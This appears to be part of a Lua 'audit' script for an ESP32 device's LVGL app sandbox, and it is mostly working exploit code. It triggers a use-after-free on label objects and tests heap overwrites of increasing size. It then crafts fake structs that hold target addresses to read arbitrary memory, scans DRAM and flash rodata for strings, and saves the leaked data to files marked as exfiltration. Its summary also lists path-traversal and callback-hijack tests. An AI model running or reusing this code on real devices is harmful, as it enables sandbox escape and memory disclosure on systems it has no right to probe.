        { desc = "overwrite 16B", fn = function()
            local payload = string.rep("B", 16)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 16B" end
            titleCard._uaf_max = 16
            return C_GREEN, "16B STABLE"
        end },
        { desc = "overwrite 32B", fn = function()
            local payload = string.rep("C", 32)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 32B" end
            titleCard._uaf_max = 32
            return C_GREEN, "32B STABLE"
        end },
        { desc = "overwrite 64B", fn = function()
            local payload = string.rep("D", 64)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 64B" end
            titleCard._uaf_max = 64
            return C_GREEN, "64B STABLE"
        end },
        { desc = "overwrite 128B", fn = function()
            local payload = string.rep("E", 128)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 128B" end
            titleCard._uaf_max = 128
            return C_GREEN, "128B STABLE"
        end },
        { desc = "overwrite 256B", fn = function()
            local payload = string.rep("F", 256)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 256B" end
            titleCard._uaf_max = 256
            return C_GREEN, "256B STABLE"
        end },
        { desc = "overwrite 512B", fn = function()
            local payload = string.rep("G", 512)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 512B" end
            titleCard._uaf_max = 512
            return C_GREEN, "512B STABLE"
        end },

        -- C11 : Lire la memoire via spy AVANT corruption
        -- Planter un nouveau spy frais pour lire ce qu'il y a en RAM
        { desc = "exfil: fresh spy read", fn = function()
            -- Nouveau spy : creer un label, le supprimer, lire via dangling ptr
            local spy2 = lv.label.new(window)
            lv.label.set_text(spy2, "MARKER_FRESH")
            lv.obj.add_flag(spy2, lv.OBJ_FLAG_HIDDEN)
            lv.obj.del(spy2)
            -- Creer un nouveau label pour reutiliser le bloc
            local victim2 = lv.label.new(window)
            lv.label.set_text(victim2, "REUSE_CHECK_EXFIL")
            lv.obj.add_flag(victim2, lv.OBJ_FLAG_HIDDEN)
            -- Lire via le dangling pointer
            local ok, txt = pcall(lv.label.get_text, spy2)
            if ok and txt then
                titleCard._uaf_exfil_read = txt
                local preview = txt
                if #preview > 20 then preview = string.sub(preview, 1, 19) .. ".." end
                return C_GREEN, "READ " .. #txt .. "B"
            end
            titleCard._uaf_exfil_read = "FAIL"
            return C_RED, "read failed"
        end },

        -- C12 : Lire le contenu du spy original (apres overwrites)
        { desc = "exfil: spy read post-corrupt", fn = function()
            local ok, txt = pcall(lv.label.get_text, titleCard._uaf_spy)
            if ok and txt then
                titleCard._uaf_exfil_post = txt
                return C_GREEN, "READ " .. #txt .. "B"
            end
            titleCard._uaf_exfil_post = "FAIL"
            return C_RED, "read failed"
        end },

        -- C13 : Lire le victim label (devrait contenir le dernier overwrite)
        { desc = "exfil: victim read", fn = function()
            local ok, txt = pcall(lv.label.get_text, titleCard._uaf_victim_lbl)
            if ok and txt then
                titleCard._uaf_exfil_victim = txt
                return C_GREEN, "READ " .. #txt .. "B"
            end
            titleCard._uaf_exfil_victim = "FAIL"
            return C_RED, "read failed"
        end },

        -- C14 : EXFILTRATION — sauvegarder tout dans un fichier .save
        -- AVANT le heap spray car le heap est probablement corrompu
        { desc = "exfil: save to file", fn = function()
            local report = {}
            report.target_addr = tostring(titleCard._uaf_target)
            report.max_overwrite = titleCard._uaf_max or 0
            report.fresh_read = titleCard._uaf_exfil_read or "N/A"
            report.post_corrupt = titleCard._uaf_exfil_post or "N/A"
            report.victim_read = titleCard._uaf_exfil_victim or "N/A"
            local ok, err = pcall(progression.save, "uaf_exfil", report)
            if ok then
                return C_GREEN, "SAVED uaf_exfil.save"
            end
            return C_RED, "save err: " .. tostring(err)
        end },

        -- C16 : Verifier la relecture du fichier exfiltre
        { desc = "exfil: verify save", fn = function()
            local ok, data = pcall(progression.load, "uaf_exfil")
            if not ok then return C_RED, "load err" end
            if type(data) ~= "table" then return C_AMBER, type(data) end
            local n = 0
            for _ in pairs(data) do n = n + 1 end
            if n > 0 then
                local max = data.max_overwrite or "?"
                return C_GREEN, n .. "k max=" .. tostring(max) .. "B"
            end
            return C_AMBER, "EMPTY"
        end },

        -- ================================================================
        --  PHASE 8 : STRING HUNTER — scan DRAM for readable strings
        --  Relies on natural heap fragmentation from prior test phases.
        --  Resumes after reboots via hunt_cursor.save.
        -- ================================================================
        { _hdr = "STRING HUNTER" },

        -- H1 : Setup helper + detect ESP32 + load resume cursor
        { desc = "hunt: setup", fn = function()
            titleCard._hunt_helper = lv.label.new(window)
            lv.label.set_text(titleCard._hunt_helper, "H")
            lv.obj.add_flag(titleCard._hunt_helper, lv.OBJ_FLAG_HIDDEN)

            local tmp = lv.label.new(window)
            local addr = tostring(tmp)
            titleCard._hunt_is_esp32 = string.find(addr, "0x3[fF]") ~= nil
            lv.obj.del(tmp)

            if not titleCard._hunt_is_esp32 then
                return C_GREY, "SKIP (not ESP32)"
            end

            -- Load resume cursor if exists
            titleCard._hunt_resume_idx = 0
            titleCard._hunt_resume_chunks = 0
            titleCard._hunt_resume_strings = 0
            local cok, cursor = pcall(progression.load, "hunt_cursor")
            if cok and type(cursor) == "table" and cursor.idx then
                titleCard._hunt_resume_idx = tonumber(cursor.idx) or 0
                titleCard._hunt_resume_chunks = tonumber(cursor.chunks) or 0
                titleCard._hunt_resume_strings = tonumber(cursor.strings) or 0
            end

            local info = "ready"
            if titleCard._hunt_resume_idx > 0 then
                info = "RESUME@" .. titleCard._hunt_resume_idx
            end
            return C_GREEN, info
        end },

        -- H2 : Calibrate struct size using natural heap fragmentation
        { desc = "hunt: calibrate", fn = function()
            if not titleCard._hunt_is_esp32 then
                return C_GREY, "SKIP"
            end

            local safe = string.char(0x01, 0x0D, 0xCB, 0x3F)
            local found_sz = nil

            for sz = 63, 99, 4 do
                lv.label.set_text(titleCard._hunt_helper, "H")
                local probe = lv.label.new(window)
                lv.label.set_text(probe, "P")
                lv.obj.add_flag(probe, lv.OBJ_FLAG_HIDDEN)
                lv.obj.del(probe)
                local craft = string.sub(string.rep(safe, 26), 1, sz)
                lv.label.set_text(titleCard._hunt_helper, craft)
                local ok, txt = pcall(lv.label.get_text, probe)
                if ok and txt and #txt > 0 then
                    found_sz = sz
                    break
                end
            end

            if found_sz then
                titleCard._hunt_ok = true
                titleCard._hunt_sz = found_sz
                pcall(progression.save, "hunt_calib", {
                    sz = tostring(found_sz),
                    status = "OK"
                })
                return C_GREEN, "OK sz=" .. found_sz
            end

            titleCard._hunt_ok = false
            pcall(progression.save, "hunt_calib", { status = "FAIL" })
            return C_RED, "FAIL all sizes"
        end },

        -- H3 : Scan DRAM for printable strings via timer
        -- 1 read/tick, 150ms, saves chunks of 16 strings
        { desc = "hunt: scan DRAM", fn = function()
            if not titleCard._hunt_ok then
                return C_GREY, "SKIP (calib fail)"
            end

            local TEXT_OFFSET = 36
            local STRUCT_SZ = titleCard._hunt_sz or 63
            local STEP = 256
            local STRINGS_PER_SAVE = 16
            local CURSOR_SAVE_EVERY = 50

            -- Build address list: DRAM then Flash rodata
            local addrs = {}
            -- DRAM: 0x3FC88000 to 0x3FD00000
            for a = 0x3FC88000, 0x3FCFFFFF, STEP do
                addrs[#addrs + 1] = a
            end
            -- Flash rodata: 0x3C000000 to 0x3C100000
            for a = 0x3C000000, 0x3C0FFFFF, STEP do
                addrs[#addrs + 1] = a
            end

            local function addr_to_le(a)
                return string.char(
                    a % 256,
                    math.floor(a / 256) % 256,
                    math.floor(a / 65536) % 256,
                    math.floor(a / 16777216) % 256
                )
            end

            local function make_craft(target)
                local fill = string.char(0x01)
                local before = string.rep(fill, TEXT_OFFSET)
                local addr_bytes = addr_to_le(target)
                local after_len = STRUCT_SZ - TEXT_OFFSET - 4
                if after_len < 0 then after_len = 0 end
                local after = string.rep(fill, after_len)
                return before .. addr_bytes .. after
            end

            local function read_at(target)
                lv.label.set_text(titleCard._hunt_helper, "H")
                local p = lv.label.new(window)
                lv.label.set_text(p, "P")
                lv.obj.add_flag(p, lv.OBJ_FLAG_HIDDEN)
                lv.obj.del(p)
                lv.label.set_text(titleCard._hunt_helper, make_craft(target))
                local ok, txt = pcall(lv.label.get_text, p)
                if ok and txt and #txt > 0 then
                    return txt
                end
                return nil
            end

            local function is_printable(s)
                for i = 1, #s do
                    local b = string.byte(s, i)
                    if b < 0x20 or b > 0x7E then
                        return false
                    end
                end
                return true
            end

            -- Resume state
            local idx = titleCard._hunt_resume_idx
            local chunk_num = titleCard._hunt_resume_chunks
            local strings_found = titleCard._hunt_resume_strings
            local reads_done = 0
            local str_buf = {}
            local str_buf_n = 0

            titleCard._scan_running = true

            local prog_lbl = lv.label.new(window)
            lv.obj.set_style_text_color(prog_lbl, C_CYAN, 0)
            lv.obj.align(prog_lbl, lv.ALIGN_BOTTOM_LEFT, 4, -16)
            lv.label.set_text(prog_lbl, "hunting...")

            local function flush_strings()
                if str_buf_n == 0 then return end
                local flat = table.concat(str_buf, "|")
                pcall(progression.save,
                    "hunt_" .. chunk_num,
                    { d = flat })
                chunk_num = chunk_num + 1
                str_buf = {}
                str_buf_n = 0
            end

            local function save_cursor()
                pcall(progression.save, "hunt_cursor", {
                    idx = tostring(idx),
                    chunks = tostring(chunk_num),
                    strings = tostring(strings_found),
                    sz = tostring(STRUCT_SZ)
                })
            end

            titleCard._hunt_timer = lv.timer.new(function()
                if idx >= #addrs then
                    flush_strings()
                    save_cursor()
                    pcall(progression.save, "hunt_meta", {
                        total_addrs = tostring(#addrs),
                        strings_found = tostring(strings_found),
                        chunks = tostring(chunk_num),
                        reads = tostring(reads_done),
                        status = "COMPLETE"
                    })
                    lv.label.set_text(prog_lbl,
                        "DONE " .. strings_found .. "s " ..
                        chunk_num .. "ch " .. reads_done .. "r")
                    lv.obj.set_style_text_color(prog_lbl, C_GREEN, 0)
                    lv.timer.del(titleCard._hunt_timer)
                    titleCard._hunt_timer = nil
                    titleCard._scan_running = false
                    return
                end

                idx = idx + 1
                local target = addrs[idx]
                local txt = read_at(target)
                reads_done = reads_done + 1

                if txt and #txt >= 4 and is_printable(txt) then
                    strings_found = strings_found + 1
                    local entry = string.format("%08X:%s", target, txt)
                    str_buf_n = str_buf_n + 1
                    str_buf[str_buf_n] = entry
                    if str_buf_n >= STRINGS_PER_SAVE then
                        flush_strings()
                    end
                end

                -- Save cursor periodically for resume
                if reads_done % CURSOR_SAVE_EVERY == 0 then
                    save_cursor()
                end

                local pct = math.floor(idx * 100 / #addrs)
                lv.label.set_text(prog_lbl,
                    pct .. "% " .. strings_found .. "s r=" .. reads_done ..
                    "/" .. #addrs)
            end, 150, nil)

            return C_GREEN, "hunt started " .. #addrs .. " addrs"
        end },

    }

    -- Execution sequentielle avec timer
    local MAX_Y = 185   -- laisser de la place pour le nav hint
    local idx = 0
    local _timer
    local cur_y = 0

    -- Cree un nouvel ecran
    local function new_page(title)
        _setup_bg()
        titleCard._trav_page = titleCard._trav_page + 1
        cur_y = 2

        local _hdr = lv.label.new(window)
        lv.label.set_text(_hdr, title .. "  P" .. titleCard._trav_page)
        lv.obj.set_style_text_color(_hdr, C_RED, 0)
        lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_16, 0)
        lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, 0)
        cur_y = 18
    end

    local function _next_test()
        -- Si un scan DRAM est en cours, attendre qu'il finisse
        if titleCard._scan_running then
            return  -- le timer continuera a appeler _next_test
        end
        idx = idx + 1
        if idx > #tests then
            -- Termine
            lv.timer.del(_timer)
            _timer = nil
            _add_nav_button(window, function()
                titleCard._show_summary()
            end, "SUMMARY")
            return
        end

        local t = tests[idx]

        -- Header de section ? Nouvelle page
        if t._hdr then
            -- Pause : attendre Enter avant la section suivante
            -- sauf si on est au tout debut
            if titleCard._trav_page > 0 then
                lv.timer.del(_timer)
                _timer = nil
                local next_idx = idx  -- sauver pour reprise
                _add_nav_button(window, function()
                    idx = next_idx  -- sauter le header (deja affiche par new_page)
                    new_page(t._hdr)
                    _timer = lv.timer.new(function() _next_test() end, 150, nil)
                end, t._hdr)
            else
                new_page(t._hdr)
            end
            return
        end

        -- Pagination auto si ecran plein
        if cur_y > MAX_Y then
            lv.timer.del(_timer)
            _timer = nil
            local next_idx = idx - 1  -- re-tester celui-ci
            _add_nav_button(window, function()
                idx = next_idx
                new_page("PATH TRAVERSAL")
                _timer = lv.timer.new(function() _next_test() end, 150, nil)
            end, "SUITE")
            return
        end

        -- Afficher le nom du test AVANT execution
        titleCard._trav_num = titleCard._trav_num + 1
        local num = titleCard._trav_num
        local txt = string.format("T%02d: %s ...", num, t.desc)
        print("[TRAV] " .. txt)

        local lbl = lv.label.new(window)
        lv.label.set_text(lbl, txt)
        lv.obj.set_style_text_color(lbl, C_WHITE, 0)
        lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 4, cur_y)

        -- Executer le test (au prochain tick, apres rendu)
        -- NON : on execute maintenant mais le label est deja affiche
        -- Le rendu LVGL se fait entre les ticks du timer
        local pok, color, result = pcall(t.fn)
        if not pok then
            local rtxt = string.format("T%02d: %s CRASH", num, t.desc)
            lv.label.set_text(lbl, rtxt)
            lv.obj.set_style_text_color(lbl, C_RED, 0)
            print("[TRAV] " .. rtxt)
        else
            local rdesc = t.desc
            if #rdesc > 18 then rdesc = string.sub(rdesc, 1, 17) .. ".." end
            local rtxt = string.format("T%02d: %s %s", num, rdesc, tostring(result))
            if #rtxt > 46 then rtxt = string.sub(rtxt, 1, 45) .. ".." end
            lv.label.set_text(lbl, rtxt)
            lv.obj.set_style_text_color(lbl, color, 0)
            print("[TRAV] " .. rtxt)
        end

        cur_y = cur_y + 11
    end

    -- Demarrer
    new_page("LOAD TRAVERSAL")
    -- Sauter le premier header (deja affiche)
    idx = 1
    _timer = lv.timer.new(function() _next_test() end, 150, nil)
end

-- ============================================================================
--  ECRAN FINAL : RESUME DE L'AUDIT
-- ============================================================================
function titleCard._show_summary()
    _setup_bg()

    local _hdr = lv.label.new(window)
    lv.label.set_text(_hdr, "AUDIT SUMMARY")
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_20, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, 2)

    local _y = 28
    local function _line(txt, color)
        local lbl = lv.label.new(window)
        lv.label.set_text(lbl, txt)
        lv.obj.set_style_text_color(lbl, color, 0)
        lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 6, _y)
        _y = _y + 14
    end

    _line("1. UAF Heap Corruption", C_CYAN)
    _line("   CONFIRMED - DRAM 0x3FCB0D40", C_GREEN)

    _line("2. Sandbox io/os/debug", C_CYAN)
    _line("   ALL nil - strict sandbox", C_AMBER)

    _line("3. Path Traversal", C_CYAN)
    _line("   save:WRITTEN load:see results", C_WHITE)

    _line("4. Write Verify (escape?)", C_CYAN)
    _line("   roundtrip ../../tmp + /str + /etc", C_WHITE)

    _line("5. Read Primitives", C_CYAN)
    _line("   require() + Global.load_module()", C_WHITE)

    _line("6. UAF Callback Hijack", C_CYAN)
    _line("   overwrite boundary + stability", C_WHITE)

    _line("7. Debug Residuals", C_CYAN)
    local has_gdb = type(break_gdb) == "function"
    local has_mem = type(print_mem_stat) == "function"
    if has_gdb or has_mem then
        local found = {}
        if has_gdb then found[#found + 1] = "break_gdb" end
        if has_mem then found[#found + 1] = "print_mem_stat" end
        _line("   " .. table.concat(found, ", "), C_AMBER)
    else
        _line("   none found", C_GREY)
    end

    local _end = lv.label.new(window)
    lv.label.set_text(_end, "-- AUDIT COMPLETE --")
    lv.obj.set_style_text_color(_end, C_GREEN, 0)
    lv.obj.set_style_text_font(_end, lv.font.nunito_extrabold_16, 0)
    lv.obj.align(_end, lv.ALIGN_BOTTOM_MID, 0, -4)
end

return titleCard
